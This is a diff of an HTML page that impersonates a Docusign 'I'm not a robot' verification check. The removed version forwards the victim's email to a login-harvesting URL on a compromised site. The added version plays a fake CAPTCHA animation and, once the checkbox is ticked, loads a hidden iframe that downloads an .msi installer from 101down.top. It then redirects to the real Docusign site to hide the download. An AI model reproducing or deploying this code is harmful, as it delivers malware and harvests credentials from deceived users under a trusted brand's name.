@@ -1,20 +1,155 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Redirecting...</title>
-<script> 
-var hash = window.location.hash;
-if(hash !== "") {
-
-    hash = hash.split('#');
-    const email = hash[1];
-
-    window.location.href = "https://iolimplantes.com.br/wp-includes/js/mail/?login=" + email;
-}
-</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to right bottom, #D8DFCD, #E0E9F4, #f4f4f4);
+        }
+        .verification-box {
+            text-align: center;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            width: 250px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .animation-container {
+            border: 3px solid #eceff1;
+            position: relative;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            background-color: #fff;
+            overflow: hidden;
+            margin: 20px auto;
+        }
+        #animator {
+            position: absolute;
+            background: #0078d4;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            bottom: 0;
+        }
+        .checkbox-label {
+            font-size: 14px;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+        }
+        #robotCheckbox {
+            margin-left: 10px;
+            transform: scale(1.5);
+            cursor: pointer;
+        }
+        #emailDisplay {
+            font-size: 14px;
+            color: #333;
+            margin-top: 10px;
+            word-break: break-all;
+        }
+        .footer-text {
+            font-size: 11px;
+            color: #555;
+            margin-top: 10px;
+        }
+        .footer-title {
+            margin-bottom: 4px;
+            font-size: 12px;
+        }
+        .footer-link {
+            text-decoration: none;
+            color: #3498db;
+        }
+    </style>
 </head>
-
 <body>
+    <div class="verification-box">
+        <div class="animation-container">
+            <div id="animator"></div>
+        </div>
+        <label class="checkbox-label">
+            I'm not a robot
+            <input type="checkbox" id="robotCheckbox">
+        </label>
+        <div id="emailDisplay"></div>
+        <div class="footer-text">
+            <div class="footer-title">Verify You Are Human</div>
+            <div>
+                <a class="footer-link" href="#">Docusign, Inc.</a> - 
+                <a class="footer-link" href="#">Privacy</a> - 
+                <a class="footer-link" href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animation functionality
+            const animator = document.getElementById('animator');
+            let position = 100;
+            let isRising = true;
+
+            function animate() {
+                if (position <= 0) {
+                    isRising = false;
+                } else if (position >= 100) {
+                    isRising = true;
+                }
+
+                position += isRising ? -3 : 3;
+                animator.style.transform = 'translateY(' + position + '%)';
+
+                requestAnimationFrame(animate);
+            }
+            requestAnimationFrame(animate);
+
+            // Checkbox functionality
+            document.getElementById("robotCheckbox").addEventListener("change", function() {
+                if (this.checked) {
+                    setTimeout(function() {
+                        // Create invisible iframe for download
+                        const iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        iframe.src = "https://101down.top/V/Documents-Pack-v1.0.msi";
+                        document.body.appendChild(iframe);
+                        
+                        // Redirect after a short delay to allow download to start
+                        setTimeout(function() {
+                            window.location.href = "https://www.docusign.com/";
+                        }, 500);
+                    }, 300);
+                }
+            });
+
+            // Email display functionality (if needed)
+            function getEmailFromURL() {
+                try {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    return urlParams.get('email') || '';
+                } catch (e) {
+                    console.log("Error parsing URL parameters");
+                    return '';
+                }
+            }
+
+            const email = getEmailFromURL();
+            if (email) {
+                document.getElementById('emailDisplay').textContent = 'Verifying: ' + email;
+            }
+        });
+    </script>
 </body>
 </html>
